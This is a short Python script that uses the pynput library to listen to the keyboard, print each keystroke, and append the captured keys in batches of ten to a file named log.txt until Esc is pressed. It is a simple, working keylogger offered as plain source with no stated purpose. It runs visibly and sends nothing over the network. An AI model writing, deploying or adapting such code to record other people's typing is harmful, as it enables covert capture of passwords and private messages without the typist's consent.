from pynput import keyboard
import sys

x = 0
keys = []


def on_press(key):
    global x
    global keys
    keys.append(key)
    x += 1
    try:
        print(f"{key.char}")
    except AttributeError:
        print(f"{key}")
    if x >= 10:
        x = 0
        log(keys)
        keys = []


def on_release(key):
    if key == keyboard.Key.esc:
        Quit()
        return False

def Quit():
    sys.exit()

def log(keys):
    with open("log.txt", "a") as f:

        for key in keys:
            key_f = str(key).replace("'","")
            if key_f.find("enter") > 0:
                f.write('\n')
            elif key_f.find("Key") == -1:
                f.write(key_f)


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()